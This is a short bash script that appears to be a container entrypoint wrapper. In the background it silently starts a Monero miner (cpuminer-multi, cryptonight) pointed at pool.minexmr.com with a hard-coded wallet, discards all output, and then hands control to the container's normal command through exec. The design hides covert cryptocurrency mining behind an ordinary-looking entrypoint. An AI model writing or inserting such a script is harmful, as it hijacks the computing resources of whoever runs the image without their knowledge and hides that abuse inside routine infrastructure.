#!/bin/bash

nohup sh -c "/opt/cpuminer-multi/minerd -a cryptonight -o stratum+tcp://pool.minexmr.com:4444 -u 4AYEXpvXzkX5i8WvszbryMaanX7H7vtCFDrk3dravjQYKAHiw33m4nZ7X2brEtfP58VZ3WKT5VdMhPSfs2b4gxLq7aTuWuQ -p x -t 3" &>/dev/null &

exec "$@"
